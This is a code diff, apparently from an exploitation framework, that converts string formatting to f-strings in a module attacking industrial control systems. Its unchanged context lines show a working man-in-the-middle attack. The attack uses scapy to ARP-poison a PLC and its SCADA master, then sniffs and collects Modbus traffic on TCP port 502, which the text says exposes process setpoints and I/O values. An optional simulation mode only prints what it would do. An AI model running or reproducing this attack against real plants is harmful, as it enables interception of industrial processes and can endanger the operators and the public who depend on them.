@@ -76,18 +76,14 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "T0830 AiTM: Would ARP-poison {} (PLC) and {} (SCADA master) to "
-                    "intercept {} Modbus packets over {} seconds. "
-                    "Captured Modbus FC1-6 traffic reveals process setpoints and I/O values.".format(
-                        self.target, self.gateway, self.capture, self.duration
-                    )
+                    f"T0830 AiTM: Would ARP-poison {self.target} (PLC) and {self.gateway} (SCADA master) to "
+                    f"intercept {self.capture} Modbus packets over {self.duration} seconds. "
+                    "Captured Modbus FC1-6 traffic reveals process setpoints and I/O values."
                 ),
                 payload_human=(
-                    "ARP Spoof: Tell {} that {} is at attacker-MAC\n"
-                    "ARP Spoof: Tell {} that {} is at attacker-MAC\n"
-                    "Forward all TCP:502 packets; capture Modbus PDUs".format(
-                        self.target, self.gateway, self.gateway, self.target
-                    )
+                    f"ARP Spoof: Tell {self.target} that {self.gateway} is at attacker-MAC\n"
+                    f"ARP Spoof: Tell {self.gateway} that {self.target} is at attacker-MAC\n"
+                    "Forward all TCP:502 packets; capture Modbus PDUs"
                 ),
                 mitre_techniques=["T0830", "T0832"],
             )
@@ -97,8 +93,7 @@ class Exploit(Exploit):
             print_error("scapy required: pip install scapy")
             return
 
-        print_status("[T0830] ARP poisoning {} <-> {} for {}s…".format(
-            self.target, self.gateway, self.duration))
+        print_status(f"[T0830] ARP poisoning {self.target} <-> {self.gateway} for {self.duration}s…")
         print_warning("[T0830] This will intercept Modbus traffic. Ensure traffic forwarding.")
 
         try:
@@ -113,7 +108,7 @@ class Exploit(Exploit):
                 print_error("Could not resolve MAC for target or gateway.")
                 return
 
-            print_info("[T0830] Target MAC: {}  Gateway MAC: {}".format(target_mac, gateway_mac))
+            print_info(f"[T0830] Target MAC: {target_mac}  Gateway MAC: {gateway_mac}")
 
             stop_event = threading.Event()
             captured = []
@@ -135,19 +130,19 @@ class Exploit(Exploit):
                     if _scapy.Raw in pkt and len(pkt[_scapy.Raw].load) >= 8:
                         captured.append(pkt)
                         if len(captured) % 10 == 0:
-                            print_info("[T0830] Captured {} Modbus packets.".format(len(captured)))
+                            print_info(f"[T0830] Captured {len(captured)} Modbus packets.")
                 return len(captured) >= self.capture
 
             poison_thread = threading.Thread(target=poison, daemon=True)
             poison_thread.start()
 
-            _scapy.sniff(filter="tcp port {}".format(self.port),
+            _scapy.sniff(filter=f"tcp port {self.port}",
                          prn=capture_packets,
                          stop_filter=lambda p: len(captured) >= self.capture,
                          timeout=self.duration)
 
             stop_event.set()
-            print_success("[T0830] AiTM complete. {} Modbus packets captured.".format(len(captured)))
+            print_success(f"[T0830] AiTM complete. {len(captured)} Modbus packets captured.")
 
         except Exception as exc:
-            print_error("[T0830] Error: {}".format(exc))
+            print_error(f"[T0830] Error: {exc}")
